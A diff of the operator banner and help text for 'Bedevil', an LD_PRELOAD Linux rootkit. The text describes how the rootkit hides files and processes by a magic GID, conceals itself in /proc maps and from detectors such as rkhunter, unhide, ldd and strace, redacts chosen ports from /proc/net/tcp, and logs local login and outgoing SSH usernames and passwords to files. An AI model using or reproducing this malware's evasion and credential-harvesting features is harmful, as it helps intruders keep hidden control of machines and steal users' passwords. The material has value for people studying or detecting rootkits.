@@ -1,41 +1,48 @@
-   ___                    ___                             ___  
-  (   )                  (   )                      .-.  (   ) 
-   | |.-.     .--.     .-.| |    .--.    ___  ___  ( __)  | |  
-   | /   \   /    \   /   \ |   /    \  (   )(   ) (''")  | |  
-   |  .-. | |  .-. ; |  .-. |  |  .-. ;  | |  | |   | |   | |  
-   | |  | | |  | | | | |  | |  |  | | |  | |  | |   | |   | |  
-   | |  | | |  |/  | | |  | |  |  |/  |  | |  | |   | |   | |  
-   | |  | | |  ' _.' | |  | |  |  ' _.'  | |  | |   | |   | |  
-   | '  | | |  .'.-. | '  | |  |  .'.-.  ' '  ; '   | |   | |  
-   ' `-' ;  '  `-' / ' `-'  /  '  `-' /   \ `' /    | |   | |  
-    `.__.    `.__.'   `.__,'    `.__.'     '_.'    (___) (___) 
-                                                             
-                                                             
-  (if reading this in an interactive shell, press q at any point
-   to leave. this will not show again.)
 
+     __               __                __  __ 
+    |  |--..-----..--|  |.-----..--.--.|__||  |
+    |  _  ||  -__||  _  ||  -__||  |  ||  ||  |
+    |_____||_____||_____||_____| \___/ |__||__|
+                                           
+                     BEDEVIL
+             LD_PRELOAD Linux rootkit...
+ 
   Warning: I am not responsible whatsoever for your actions. Ever.
 
-  Rootkit information:
-
+  General information:
     - File & process hiding is managed by a magic GID.
-    - Bedevil will persistently remain in control.
+    - Bedevil will persistently try to maintain control.
 
-    - Any ports you want to keep hidden should be written
-      to 'hide_ports' in your home directory. This supports
-      port ranges too.
-        (i.e.:) '105' or '103-110'
-      Every new port or port range to be hidden must be on
-      a line of its own.
+  Presence hiding:
+    - The presence of the rootkit library is hidden from the
+      following:
+      - /proc/*/maps
+      - /proc/*/smaps
+      - /proc/*/numa_maps
+      - Processes (default): lsrootkit, ldd, unhide, rkhunter,
+                             chkproc, chkdirs, ltrace, strace
+      - Paths (default): */*ld-linux*.so.*, *ld-linux*.so.*,
+                         */*ld-*.so, *ld-*.so, */utmp, utmp
+      - Vars (default): LD_TRACE_LOADED_OBJECTS, LD_DEBUG, LD_AUDIT
 
-    - Successful user authentications on this machine are
-      logged to 'auth_logs', with the respective username
-      and password, in your home directory.
-      Outgoing ssh logs are also logged into your home directory,
-      in a file called 'ssh_logs', along with the username used,
-      the host and the password.
-    
-    - Do NOT delete your home directory. There are scripts
-      available at your leisure which live in 'etc/'. Run
-      or read them for more information.
+  Port hiding:
+    - Ports you want hidden should be written to '~/hide_ports'.
+      You can write port ranges too by using a hyphen as the range
+      delimiter.
+        Example:
+          103
+          106-108
+          200-205
+          31
+    - Ports/port ranges written to this file are redacted from
+      '/proc/net/tcp*' output. Tools such as netstat will not show
+      information about hidden network connections.
+
+  Logs information:
+    - If 'LOG_LOCAL_AUTH' is enabled, the logs are written to
+      '~/auth_logs', with respective usernames and passwords.
+
+    - If 'LOG_SSH' is enabled, the logs are written to '~/ssh_logs',
+      with the host connected to, along with the username and
+      password used.
 
